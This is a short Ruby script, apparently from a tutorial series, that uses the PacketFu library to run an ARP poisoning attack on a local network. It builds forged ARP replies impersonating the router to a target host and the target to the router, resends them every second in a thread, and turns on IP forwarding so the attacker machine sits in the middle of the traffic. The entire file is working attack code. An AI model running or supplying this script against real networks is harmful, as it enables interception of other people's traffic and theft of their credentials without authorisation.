#!/usr/bin/env ruby

require 'packetfu'
require 'thread'

# Builds on the previous ARP spoofing example.
# The sending of ARP packets is done in a separate thread. 

target_mac  = "b8:ac:6f:34:ad:d8"
target_ip   = "192.168.1.101"
sender_mac  = "7c:7a:91:7d:2b:02"
sender_ip   = "192.168.1.100"
router_ip   = "192.168.1.1"
router_mac  = "00:22:6b:7c:9b:12"
@iface       = "wlp2s0"

# Construct the target's packet
arp_packet_target = PacketFu::ARPPacket.new()
arp_packet_target.eth_saddr = sender_mac       # sender's MAC address
arp_packet_target.eth_daddr = target_mac       # target's MAC address
arp_packet_target.arp_saddr_mac = sender_mac   # sender's MAC address
arp_packet_target.arp_daddr_mac = target_mac   # target's MAC address
arp_packet_target.arp_saddr_ip = router_ip     # router's IP
arp_packet_target.arp_daddr_ip = target_ip     # target's IP
arp_packet_target.arp_opcode = 2               # arp code 2 == ARP reply
 
# Construct the router's packet
arp_packet_router = PacketFu::ARPPacket.new()
arp_packet_router.eth_saddr = sender_mac       # sender's MAC address
arp_packet_router.eth_daddr = router_mac       # router's MAC address
arp_packet_router.arp_saddr_mac = sender_mac   # sender's MAC address
arp_packet_router.arp_daddr_mac = router_mac   # router's MAC address
arp_packet_router.arp_saddr_ip = target_ip     # target's IP
arp_packet_router.arp_daddr_ip = router_ip     # router's IP
arp_packet_router.arp_opcode = 2               # arp code 2 == ARP reply

# Enable IP forwarding
`echo 1 > /proc/sys/net/ipv4/ip_forward`

def runspoof(arp_packet_target,arp_packet_router)
  # Send out both packets
  puts "Spoofing...."
  caught=false
  while caught==false do
    sleep 1
    arp_packet_target.to_w(@iface)
    arp_packet_router.to_w(@iface)
  end
end

begin
  puts "Starting the ARP poisoning thread..."
  spoof_thread = Thread.new{runspoof(arp_packet_target,arp_packet_router)} 
  spoof_thread.join
  # Catch the interrupt and kill the thread
  rescue Interrupt
  puts "\nARP spoof stopped by interrupt signal."
  Thread.kill(spoof_thread)
  `echo 0 > /proc/sys/net/ipv4/ip_forward`
  exit 0
end